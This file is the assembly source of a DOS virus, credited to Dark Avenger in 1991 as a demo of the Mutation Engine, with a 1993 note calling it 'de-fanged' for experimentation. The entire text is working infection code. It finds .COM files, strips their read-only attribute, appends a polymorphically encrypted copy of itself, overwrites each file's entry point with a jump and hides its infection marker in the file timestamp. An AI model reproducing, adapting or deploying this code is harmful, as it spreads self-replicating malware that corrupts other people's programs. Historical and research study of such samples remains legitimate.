
; This is a demo virus to demonstrate
;   the Mutation Engine <tm> usage

; Version 1.01 (26-10-91)
; (C) 1991 Dark Avenger.

; De-Fanged for experimentation by Mark Ludwig 3/24/93

        .model  tiny
        .radix  16
        .code

        extrn   mut_engine: near, rnd_get: near, rnd_init: near
        extrn   rnd_buf: word, data_top: near

        org     100

start:
        call    locadr
locadr:
        pop     dx
        mov     cl,4
        shr     dx,cl
        sub     dx,10
        mov     cx,ds
        add     cx,dx                   ;Calculate new CS
        mov     dx,offset begin
        push    cx dx
        retf
begin:
        cld
        mov     di,offset start
        push    es di
        push    cs
        pop     ds
        push    ax
        mov     dx,offset dta_buf       ;Set DTA
        mov     ah,1a
        int     21
        xor     ax,ax                   ;Initialize random seed
        mov     [rnd_buf],ax
        call    rnd_init
        mov     dx,offset srchnam
        mov     cl,3
        mov     ah,4e
find_lup:
        int     21                      ;Find the next COM file
        jc      infect_done
        call    isinf                   ;see if infected
        jnz     infect                  ;If not infected, infect it now
find_nxt:
        mov     dx,offset dta_buf
        mov     ah,4f
        jmp     find_lup
infect_done:
        push    cs
        pop     ds
        push    ss
        pop     es
        mov     di,offset start
        mov     si,offset oold_cod
        movsb                           ;Restore first 3 bytes
        movsw
        push    ss
        pop     ds
        mov     dx,80                   ;Restore DTA
        mov     ah,1a
        int     21
        pop     ax
        retf


infect:
        xor     cx,cx                   ;Reset read-only attribute
        mov     dx,offset dta_buf+1e
        mov     ax,4301
        int     21
        jc      infect_done
        mov     ax,3d02                 ;Open the file
        int     21
        jc      infect_done
        xchg    ax,bx
        mov     ax,WORD PTR [old_cod]
        mov     WORD PTR [oold_cod],ax
        mov     al,BYTE PTR [old_cod+2]
        mov     BYTE PTR [oold_cod+2],al
        mov     dx,offset old_cod       ;Read first 3 bytes
        mov     cx,3
        mov     ah,3f
        int     21
        jc      read_done
        xor     cx,cx                   ;Seek at EOF
        xor     dx,dx
        mov     ax,4202
        int     21
        test    dx,dx                   ;Make sure the file is not too big
        jnz     read_done
        cmp     ax,-2000
        jnc     read_done
        mov     bp,ax
        sub     ax,3
        mov     word ptr [new_cod+1],ax
        mov     ax,cs
        add     ax,1000H
        mov     es,ax
        mov     dx,offset start
        mov     cx,offset _DATA
        push    bp bx
        add     bp,dx
        xor     si,si
        xor     di,di
        mov     bl,0f
        mov     ax,101
        call    mut_engine
        pop     bx ax
        add     ax,cx                   ;Make sure file length mod 256 = 0
        neg     ax
        xor     ah,ah
        add     cx,ax
        mov     ah,40                   ;Put the virus into the file
        int     21
        push    cs
        pop     ds
        jc      write_done
        sub     cx,ax
        jnz     write_done
        xor     dx,dx                   ;Put the JMP instruction
        mov     ax,4200
        int     21
        mov     dx,offset new_cod
        mov     cx,3
        mov     ah,40
        int     21
        jmp     write_done
read_done:
        mov     ah,3e                   ;Close the file
        int     21
        jmp     infect_done
write_done:
        mov     ax,5700H                        ;get date & time on file
        int     21H
        push    dx
        mov     ax,cx                           ;fix it
        xor     ax,dx
        mov     cx,0A
        xor     dx,dx
        div     cx
        mul     cx
        add     ax,3
        pop     dx
        xor     ax,dx
        mov     cx,ax
        mov     ax,5701H                        ;and save it
        int     21H
        jmp     read_done

;determine if file is infected
isinf:
        mov     dx,offset dta_buf+1e
        mov     ax,3d02                 ;Open the file
        int     21
        mov     bx,ax
        mov     ax,5700H                        ;get file attribute
        int     21H
        mov     ax,cx
        xor     ax,dx                           ;date xor time mod 10 = 3 for infected file
        xor     dx,dx
        mov     cx,0A
        div     cx
        cmp     dx,3
        pushf
        mov     ah,3e                   ;Close the file
        int     21
        popf
        ret


srchnam db      '*.COM',0

old_cod:                                ;Buffer to read first 3 bytes
        ret
        dw      55AA

oold_cod:                               ;old old code
        db      0,0,0

new_cod:                                ;Buffer to write first 3 bytes
        jmp     $+100

        .data

dta_buf db      2bh dup(?)              ;Buffer for DTA

        end     start
